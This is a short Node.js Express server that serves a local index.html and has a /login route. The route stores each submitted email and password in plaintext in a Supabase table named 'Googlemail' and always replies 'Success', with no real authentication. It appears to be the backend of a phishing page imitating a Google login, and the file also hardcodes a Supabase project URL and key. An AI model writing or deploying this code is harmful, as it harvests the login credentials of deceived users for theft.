const express = require("express");
const { createClient } = require("@supabase/supabase-js");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(express.json());
app.use(cors());

// IMPORTANT: This serves the HTML file
app.use(express.static(__dirname));

const supabaseUrl = 'https://eslhufyhllrubjxstyob.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVzbGh1ZnlobGxydWJqeHN0eW9iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUxMzQ0NTQsImV4cCI6MjA5MDcxMDQ1NH0.AoZ2CdIPbk8jupPfqRyTUYhy6lO6s47ED07g_TISI94'; 
const supabase = createClient(supabaseUrl, supabaseKey);

// Send index.html on the main route
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/login", async (req, res) => {
    const { email, password } = req.body;
    const { data, error } = await supabase
        .from('Googlemail')
        .insert([{ email, password }]);

    if (error) return res.status(500).json({ error: error.message });
    res.json({ message: "Success" }); 
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
